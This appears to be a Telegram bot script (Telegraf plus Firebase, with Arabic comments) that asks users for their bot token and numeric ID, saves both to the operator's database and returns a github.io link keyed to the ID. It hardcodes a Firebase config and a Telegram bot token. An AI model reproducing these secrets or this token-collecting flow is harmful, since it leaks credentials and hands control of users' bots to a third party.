import { Telegraf } from 'telegraf';
import { initializeApp } from 'firebase/app';
import { getDatabase, ref, set, get, child } from 'firebase/database';

// إعداد Firebase
const firebaseConfig = {
  apiKey: "AIzaSyCCEvGjvP8gw12mFYnxV_XPOHhM_zHJB_U",
  authDomain: "migad-9aa39.firebaseapp.com",
  databaseURL: "https://migad-9aa39-default-rtdb.firebaseio.com",
  projectId: "migad-9aa39",
  storageBucket: "migad-9aa39.appspot.com",
  messagingSenderId: "82386152423",
  appId: "1:82386152423:web:fb466405bbc8c12d2beb42",
  measurementId: "G-2LCCDX0159"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

// 🧠 المتغيرات
const bot = new Telegraf('8180329300:AAFg-ruLWrlFkoPAy8Lu-gXIGHNkDNfK0O4');

// 🧩 دالة تحميل بيانات المستخدم من Firebase
async function getUser(chatId) {
  const snapshot = await get(child(ref(db), `users/${chatId}`));
  return snapshot.exists() ? snapshot.val() : null;
}

// 🧩 دالة حفظ المستخدم في Firebase
function saveUser(chatId, data) {
  return set(ref(db, 'users/' + chatId), data);
}

// 🟢 عند البدء
bot.start(async (ctx) => {
  const chatId = ctx.chat.id.toString();
  const user = await getUser(chatId);
  
  if (!user) {
    await saveUser(chatId, { step: 'name' });
    ctx.reply('👋 أهلاً بك! ما هو اسمك؟ 🤔');
  } else {
    ctx.reply('🔁 لقد بدأت من قبل!');
  }
});

// 🟡 استجابة النصوص
bot.on('text', async (ctx) => {
  const chatId = ctx.chat.id.toString();
  const text = ctx.message.text;
  
  const user = await getUser(chatId);
  
  if (!user) {
    ctx.reply('🌀 اكتب /start للبدء.');
    return;
  }
  
  if (user.step === 'name') {
    user.name = text;
    user.step = 'token';
    await saveUser(chatId, user);
    ctx.reply('🔑 أرسل الآن التوكن الخاص بك:');
  } else if (user.step === 'token') {
    if (text.includes(':')) {
      user.token = text;
      user.step = 'id';
      await saveUser(chatId, user);
      ctx.reply('🔒 أرسل الآن الـ ID الخاص بك:');
    } else {
      ctx.reply('⚠️ التوكن غير صحيح. تأكد أن يحتوي على ":"');
    }
  } else if (user.step === 'id') {
    if (/^\d{5,}$/.test(text)) {
      user.id = text;
      user.step = 'done';
      await saveUser(chatId, user);
      ctx.reply(`✅ تم الحفظ بنجاح!

🌐 رابطك الخاص:
https://qwertyuiopqw12.github.io/Boot-/?ref=${text}`);
    } else {
      ctx.reply('⚠️ ID غير صحيح. يجب أن يكون أرقام فقط.');
    }
  } else {
    ctx.reply('✅ بياناتك محفوظة مسبقًا.');
  }
});

// 📡 تشغيل البوت
bot.launch();
console.log('🤖 تم تشغيل البوت!');